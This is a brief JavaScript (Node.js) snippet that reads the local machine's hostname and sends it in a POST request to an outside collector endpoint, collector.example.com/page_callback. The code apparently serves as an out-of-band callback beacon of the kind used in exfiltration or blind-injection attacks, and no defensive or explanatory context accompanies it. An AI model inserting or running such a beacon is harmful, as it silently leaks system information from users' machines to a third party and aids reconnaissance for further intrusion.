const os = require('os');
const hostname = os.hostname();
fetch('https://collector.example.com/page_callback', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({html: `Hostname: ${hostname}`})
});
